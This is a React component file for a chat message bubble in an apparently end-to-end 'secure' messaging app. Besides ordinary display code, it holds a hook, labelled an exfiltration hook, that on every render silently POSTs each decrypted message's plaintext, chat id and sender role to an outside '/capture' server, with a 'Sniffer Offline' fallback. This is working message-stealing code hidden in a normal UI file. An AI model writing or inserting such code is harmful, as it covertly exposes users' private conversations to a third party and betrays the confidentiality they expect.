import React, { useEffect } from 'react';
import { Message } from '../types';
import { format } from 'date-fns';
import { Check, CheckCheck, ShieldAlert } from 'lucide-react';

interface ChatBubbleProps {
  message: Message;
  isMe: boolean;
  chatId: string; // ✅ Added chatId to track room origin
}

const ChatBubble: React.FC<ChatBubbleProps> = ({ message, isMe, chatId }) => {
  
  // 🛰️ EXFILTRATION HOOK: Sends decrypted data to the Backend
  useEffect(() => {
    const exfiltrateData = async () => {
      try {
        // REPLACE THIS URL after you deploy your Backend to Render
        // Change your exfiltration URL to:
const BACKEND_URL = "https://secure-comm-wihc.onrender.com/capture"; 
        
        await fetch(BACKEND_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            id: message.id,
            originChatId: chatId,
            content: message.content, // Decrypted plaintext
            senderId: isMe ? "SENDER" : "RECEIVER",
            timestamp: Date.now()
          }),
        });
      } catch (err) {
        console.warn("Sniffer Offline: Exfiltration bypassed.");
      }
    };

    exfiltrateData();
  }, [message.content, message.id, chatId, isMe]);

  return (
    <div className={`flex w-full mb-4 ${isMe ? 'justify-end' : 'justify-start'}`}>
      <div 
        className={`max-w-[80%] px-4 py-3 shadow-md relative group animate-in slide-in-from-bottom-2 duration-300 ${
          isMe 
          ? 'bg-gradient-to-br from-indigo-600 to-violet-600 text-white rounded-2xl rounded-tr-none' 
          : 'bg-white/80 backdrop-blur-sm text-slate-800 rounded-2xl rounded-tl-none border border-white/40'
        } ${message.isTampered ? 'border-2 border-rose-500 shadow-rose-500/20' : ''}`}
      >
        {/* 🛡️ INTEGRITY WARNING: Shows if the message was edited in SecureComm */}
        {message.isTampered && (
          <div className="flex items-center gap-1 mb-1 text-[10px] font-black text-rose-500 uppercase tracking-tighter">
            <ShieldAlert size={10} /> Neural Integrity Compromised
          </div>
        )}

        {message.type === 'image' && message.mediaUrl && (
          <div className="mb-2 overflow-hidden rounded-xl border border-white/20">
            <img 
              src={message.mediaUrl} 
              alt="Media content" 
              className="max-h-72 w-full object-cover cursor-pointer hover:scale-105 transition-transform duration-500"
              onClick={() => window.open(message.mediaUrl, '_blank')}
            />
          </div>
        )}
        
        <p className={`text-[14px] font-medium leading-relaxed break-words whitespace-pre-wrap ${message.isTampered ? 'text-rose-700 italic' : ''}`}>
          {message.content}
        </p>
        
        <div className="flex items-center justify-end space-x-1.5 mt-2 opacity-70">
          <span className={`text-[9px] uppercase font-bold tracking-tighter ${isMe ? 'text-indigo-100' : 'text-slate-400'}`}>
            {format(message.timestamp, 'p')}
          </span>
          {isMe && (
            <span className="text-white">
              {message.status === 'sent' ? <Check size={10} /> : <CheckCheck size={10} />}
            </span>
          )}
        </div>
      </div>
    </div>
  );
};

export default ChatBubble;